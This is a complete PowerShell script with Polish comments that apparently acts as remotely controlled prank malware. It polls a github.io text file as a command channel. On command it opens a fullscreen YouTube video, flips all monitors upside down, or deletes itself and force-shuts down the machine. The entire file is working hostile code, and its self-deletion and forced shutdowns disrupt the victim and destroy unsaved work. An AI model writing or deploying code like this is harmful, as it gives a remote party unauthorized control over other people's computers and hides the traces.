$checkInterval = 5
$youtubeUrl = "https://www.youtube.com/watch?v=OaPNpvYTeI4"
$watchTime = 45
$url = "https://ooska4.github.io/start.txt"
$scriptPath = $MyInvocation.MyCommand.Path
$youtubeStarted = $false

Add-Type @"
using System;
using System.Runtime.InteropServices;
public class R {
    [StructLayout(LayoutKind.Sequential, CharSet=CharSet.Ansi)]
    public struct D {
        [MarshalAs(UnmanagedType.ByValTStr, SizeConst=32)] public string dmDeviceName;
        public short dmSpecVersion, dmDriverVersion, dmSize, dmDriverExtra;
        public int dmFields, dmPositionX, dmPositionY, dmDisplayOrientation, dmDisplayFixedOutput;
        [MarshalAs(UnmanagedType.ByValTStr, SizeConst=32)] public string dmFormName;
        public short dmLogPixels;
        public int dmBitsPerPel, dmPelsWidth, dmPelsHeight, dmDisplayFlags, dmDisplayFrequency;
    }
    [StructLayout(LayoutKind.Sequential, CharSet=CharSet.Ansi)]
    public struct DD {
        public int cb;
        [MarshalAs(UnmanagedType.ByValTStr, SizeConst=32)] public string DeviceName;
        [MarshalAs(UnmanagedType.ByValTStr, SizeConst=128)] public string DeviceString;
        public int StateFlags;
        [MarshalAs(UnmanagedType.ByValTStr, SizeConst=128)] public string DeviceID;
        [MarshalAs(UnmanagedType.ByValTStr, SizeConst=128)] public string DeviceKey;
    }
    [DllImport("user32.dll")] public static extern bool EnumDisplayDevices(string lpDevice, uint iDevNum, ref DD lpDisplayDevice, uint dwFlags);
    [DllImport("user32.dll")] public static extern int EnumDisplaySettings(string name, int mode, ref D dev);
    [DllImport("user32.dll")] public static extern int ChangeDisplaySettings(ref D dev, int flags);
    [DllImport("user32.dll")] public static extern int ChangeDisplaySettingsEx(string lpszDeviceName, ref D lpDevMode, IntPtr hwnd, int dwFlags, IntPtr lParam);
}
"@

function Set-AllRotations($rot) {
    $iDev = 0
    while ($true) {
        $dd = New-Object R+DD
        $dd.cb = [Runtime.InteropServices.Marshal]::SizeOf($dd)
        $ok = [R]::EnumDisplayDevices($null, $iDev, [ref]$dd, 0)
        if (-not $ok) { break }
        
        # Tylko aktywne monitory (flaga DISPLAY_DEVICE_ACTIVE = 1)
        if ($dd.StateFlags -band 1) {
            $devName = $dd.DeviceName
            $d = New-Object R+D
            $d.dmSize = [Runtime.InteropServices.Marshal]::SizeOf($d)
            [R]::EnumDisplaySettings($devName, -1, [ref]$d) | Out-Null
            $d.dmDisplayOrientation = $rot
            $d.dmFields = 0x80
            $result = [R]::ChangeDisplaySettingsEx($devName, [ref]$d, [IntPtr]::Zero, 0, [IntPtr]::Zero)
            Write-Host "Monitor $devName -> wynik: $result"
        }
        $iDev++
    }
}

while ($true) {
    try {
        $content = Invoke-WebRequest -Uri $url -UseBasicParsing -TimeoutSec 5
        $value = $content.Content.Trim()
    } catch {
        Start-Sleep $checkInterval
        continue
    }

    
    if ($value -ne "2") {
        $youtubeStarted = $false
    }

    switch ($value) {
        "1" {
            Start-Process $youtubeUrl
            Start-Sleep 5
            Add-Type -AssemblyName System.Windows.Forms
            [System.Windows.Forms.SendKeys]::SendWait("f")
            Start-Sleep $watchTime
            if (Test-Path $scriptPath){Remove-Item $scriptPath -Force}
            Stop-Computer -Force
        }
        "2" {
            if (-not $youtubeStarted) {
                Write-Host "Uruchamiam YT, youtubeStarted=$youtubeStarted"
                Start-Process $youtubeUrl
                Start-Sleep 5
                Add-Type -AssemblyName System.Windows.Forms
                [System.Windows.Forms.SendKeys]::SendWait("f")
                $youtubeStarted = $true
                Write-Host "Po ustawieniu: youtubeStarted=$youtubeStarted"
            } else {
                Write-Host "YT już uruchomiony, pomijam"
            }
        }
        "3" {
            if (Test-Path $scriptPath){Remove-Item $scriptPath -Force}
            Stop-Computer -Force
        }
        "4" { Set-AllRotations 2 }
        "5" { Set-AllRotations 0 }
    }

    
    Start-Sleep $checkInterval
}
